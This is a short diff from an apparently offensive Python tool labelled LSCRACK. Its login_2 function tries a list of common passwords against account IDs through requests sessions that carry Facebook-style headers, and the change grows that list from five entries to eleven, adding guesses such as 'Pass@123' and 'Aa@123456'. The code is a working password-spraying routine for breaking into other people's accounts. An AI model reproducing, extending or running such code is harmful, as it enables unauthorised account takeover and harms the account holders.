@@ -388,7 +388,7 @@ def login_2(uid):
     try:
         sys.stdout.write(f'\r\r{red}|{green}LSCRACK{red}|{green} {loop} {white}| {green}OK {white}| {red}{len(oks)}{white}')
         
-        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
+        for pw in ('123456', '123123', '1234567', '12345678', 'Pass@123', 'password', 'J7#vQ2!mL9@xR4', 'Aa123456', 'Aa@123456', 'Pass@1234', '123456789'):
             with requests.Session() as session:
                 headers = {
                     'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
